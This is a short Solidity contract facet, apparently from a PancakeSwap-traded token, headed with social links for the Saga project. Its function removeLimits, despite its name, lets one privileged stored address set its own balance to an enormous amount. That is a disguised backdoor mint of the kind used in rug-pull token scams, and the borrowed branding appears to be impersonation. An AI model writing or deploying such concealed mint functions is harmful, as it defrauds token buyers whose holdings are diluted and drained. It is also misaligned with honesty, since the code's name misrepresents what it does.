/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/sagaofficialchannel
    // Twitter: https://twitter.com/Sagaxyz__
    // Website: https://www.saga.xyz/
    // Github: https://github.com/sagaxyz
    // Discord: https://discord.com/invite/UCRsTy82Ub
    // Medium: https://medium.com/sagaxyz

*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
